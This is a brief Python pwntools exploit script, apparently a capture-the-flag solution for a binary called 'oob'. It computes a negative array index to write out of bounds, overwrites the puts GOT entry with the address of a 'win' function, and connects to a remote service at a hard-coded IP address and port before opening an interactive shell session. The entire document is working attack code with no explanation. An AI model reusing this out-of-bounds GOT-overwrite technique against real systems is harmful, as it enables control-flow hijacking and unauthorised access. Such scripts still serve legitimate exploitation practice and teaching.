import pwn

puts_plt = 0x404018
arr = 0x404080
index =int((-arr+puts_plt)/4)

#p = pwn.process("./oob")
p = pwn.remote("34.71.207.70",1337)
win = pwn.ELF("./oob").symbols['win']
p.sendlineafter("index: ", str(index))
p.sendlineafter("value: ", str(win))
p.interactive()
